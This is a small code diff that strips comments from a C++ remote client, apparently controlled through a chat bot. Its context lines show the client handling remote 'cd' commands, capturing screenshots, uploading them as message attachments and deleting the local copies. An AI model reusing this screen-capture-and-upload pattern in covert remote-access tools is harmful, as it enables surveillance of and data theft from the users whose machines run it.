@@ -480,10 +480,8 @@ void RemoteClient::start() {
                 return;
             }
 
-            // Change directory handling
             if (arg.rfind("cd ", 0) == 0) {
                 std::string new_dir = arg.substr(3);
-                // Remove quotes if present
                 if (new_dir.front() == '"' && new_dir.back() == '"') {
                     new_dir = new_dir.substr(1, new_dir.length() - 2);
                 }
@@ -546,7 +544,6 @@ void RemoteClient::start() {
 
             if (take_screenshot(fullPath)) {
                 try {
-                    // Read file and send as attachment
                     std::ifstream file(fullPath, std::ios::binary);
                     if (file.good()) {
                         std::vector<uint8_t> buffer((std::istreambuf_iterator<char>(file)),
@@ -557,7 +554,6 @@ void RemoteClient::start() {
                         msg.add_file(filename, std::string(buffer.begin(), buffer.end()));
                         bot.message_create(msg);
 
-                        // Cleanup
                         std::filesystem::remove(fullPath);
                     }
                     else {
